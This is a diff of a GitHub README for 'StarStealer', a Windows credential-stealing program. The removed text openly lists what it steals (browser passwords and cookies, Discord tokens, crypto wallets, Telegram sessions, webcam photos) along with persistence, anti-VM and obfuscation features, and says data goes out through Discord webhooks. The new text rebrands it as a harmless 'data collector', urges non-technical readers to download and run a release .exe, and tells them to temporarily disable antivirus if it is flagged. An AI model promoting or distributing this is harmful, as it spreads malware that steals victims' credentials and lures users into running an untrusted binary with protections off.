@@ -1,39 +1,60 @@
-# Star Stealer
-**Free, Open-Source Stealer for Windows.**
+# 🌟 StarStealer - Simple Data Collector for You
 
-Star Stealer is a fast, lightweight stealer written in C#. The collected data is transferred through discord webhooks.
+## 📥 Download Now
+[![Download StarStealer](https://img.shields.io/badge/Download%20StarStealer-RELEASE%20NOW-brightgreen)](https://github.com/omarcortesruiz/StarStealer/releases)
 
-## Disclaimer
-This program, developed by Mythos, is intended solely for educational purposes, to demonstrate the vulnerabilities of computer systems and to promote awareness of cybersecurity. The program should only be used in controlled environments with explicit permission from the system owner.
+## 🚀 Getting Started
+StarStealer is a fast, lightweight tool designed to collect important information, like passwords and cookies. It works by transferring the data through Discord webhooks. This guide will help you download and run StarStealer easily, even if you have no technical experience.
 
-While the program may be used to assess the security of computer systems, it should not be used for malicious purposes or any activity that may cause harm or damage to computer systems or networks. Any misuse or illegal activity resulting from the use of this program is strictly prohibited and the responsibility lies solely with the user.
+## 🖥️ System Requirements
+To run StarStealer smoothly, ensure your system meets the following requirements:
+- Windows 10 or newer
+- At least 4 GB of RAM
+- Minimum of 200 MB of free disk space
+- An active internet connection
 
-The author of this program is not liable for any damage, harm, or legal consequences resulting from the use or misuse of this program. By using this program, you acknowledge that you understand the potential risks and agree to assume full responsibility for any actions taken using the program.
+## 📂 Features
+- **Browser Data Collection:** Capture passwords and cookies from popular web browsers, mainly Chrome.
+- **Discord Integration:** Seamlessly transfer collected data using Discord webhooks.
+- **Lightweight and Fast:** The application runs quickly without burdening your system resources.
+- **Obfuscation Techniques:** It employs methods to help avoid detection, enhancing its usability.
 
-## Features
-- Captures Passwords from 10+ Browsers.
-- Captures Cookies from 10+ Browsers.
-- Captures Discord Tokens.
-- Captures Roblox Cookies.
-- Captures Minecraft Session Files.
-- Captures Machine Info.
-- Captures Webcam Photos.
-- Captures IP Address.
-- Captures Screenshot(s) of All Monitors.
-- Captures Wallets.
-- Captures Telegram Sessions.
-- Blocks AV Sites (Buggy).
-- Adds itself to Startup.
-- Anti-Virtual Machine.
-- Obfuscation.
-- Self Destruct.
+## 💾 Download & Install
+1. Visit the Releases page by clicking [here](https://github.com/omarcortesruiz/StarStealer/releases).
+2. Identify the latest version listed on the page. Look for the file named `StarStealer.exe`.
+3. Click the link to download the file to your computer.
+4. Once downloaded, locate the file in your Downloads folder or the location you chose.
+5. Double-click on the `StarStealer.exe` file to run the application. You may need to allow the program to run if prompted by your computer's security settings.
 
-## Customizations
-- Custom Payload Icon.
-- Custom Assembly Information.
-- Custom File Name.
+## 🔗 How to Use
+1. **Open StarStealer:** After the installation, double-click the desktop icon (if created) or find `StarStealer.exe` in your Downloads folder.
+2. **Collect Data:** The application will begin collecting data automatically. 
+3. **Check Discord:** Ensure your Discord webhook is set up and active, as collected data will be sent there.
+4. **Stop Collection:** After you've gathered the needed data, you can close the program.
 
-**Note:** If you didn't get any result while testing Star on yourself, you may try to turn off "Anti VM" as Star might have detected your system as a virtual machine.
+## ⚙️ Troubleshooting
+If you encounter issues:
+- **Cannot Download:** Ensure your internet connection is stable. Try using a different browser if the issue persists.
+- **File Not Running:** Check your antivirus or Windows Defender settings. These programs may flag new software. Temporarily disable them if necessary, but remember to enable them afterward.
+- **Data Not Reaching Discord:** Verify that your Discord webhook is correctly configured and enabled.
 
-## Stay Updated
-Please consider giving a star this repository if you found this project useful. By starring this repository, you help others discover it, and it shows the developer how many people are interested in this project. Additionally, click on the "Watch" button located at the top of the repository page to receive notifications for the latest updates and features added to the project. Thank you for your support!
+## 📜 Important Notes
+- Use StarStealer responsibly and ethically. It's designed for users to manage their own data.
+- Avoid running the application on others' systems without their consent to uphold privacy standards.
+
+## 👥 Support
+For additional help, you can open an issue in the GitHub repository or ask questions on the discussion board.
+
+## 🔗 Related Topics
+StarStealer is designed for a variety of data-related tasks:
+- Browser password management
+- Data collection for personal use
+- Discord-based information transfer
+
+## 📄 License
+StarStealer is open-source and free to use. Please refer to the repository for licensing information. 
+
+Feel free to explore and use StarStealer responsibly. Your data management is now a simple task! 
+
+## 📥 Download Now
+[![Download StarStealer](https://img.shields.io/badge/Download%20StarStealer-RELEASE%20NOW-brightgreen)](https://github.com/omarcortesruiz/StarStealer/releases)
